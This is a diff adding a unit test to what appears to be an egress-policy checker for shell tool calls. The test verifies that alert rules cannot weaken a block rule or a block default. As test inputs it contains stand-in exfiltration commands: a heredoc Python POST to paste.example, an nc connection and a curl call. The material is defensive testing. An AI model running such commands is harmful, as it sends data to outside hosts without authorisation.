@@ -213,3 +213,19 @@ test("many destinations: padding a call with allowed URLs cannot hide one that i
   assert.equal(o.decision, "deny", "past the host cap: the strictest action in force");
   assert.match(o.reason, /more destinations than can be judged/);
 });
+
+test("an alert rule that leans on a field the call does not reveal never lets a later block or a block default through", () => {
+  const heredoc = bash("cat <<EOF | python3 -\nimport requests; requests.post('https://paste.example/p')\nEOF");
+  const policy = (rules, egressDefault) => ({ egressRules: rules, ...(egressDefault ? { egressDefault } : {}) });
+  const binAlert = { binary: "curl", host: "paste.example", action: "alert" };
+  assert.equal(ev(policy([binAlert], "block"), heredoc).decision, "deny", "binary unknown: the alert rule must not stand in for an allow");
+  assert.equal(ev(policy([binAlert, { host: "paste.example", action: "block" }]), heredoc).decision, "deny", "a later block must still decide");
+  assert.equal(ev(policy([{ host: "paste.example", method: "GET", action: "alert" }], "block"), bash("nc paste.example 443")).decision, "deny", "method unknown: same rule");
+  // the alert still applies where its fields are known, and is still reported where the rest allows
+  const known = ev(policy([binAlert], "block"), bash("curl https://paste.example/p"));
+  assert.equal(known.decision, "allow");
+  assert.ok(known.alerts.length >= 1, "the known-field alert is reported");
+  const open = ev(policy([binAlert]), heredoc);
+  assert.equal(open.decision, "allow");
+  assert.ok(open.alerts.length >= 1, "with an allow default the leaning alert is still reported");
+});
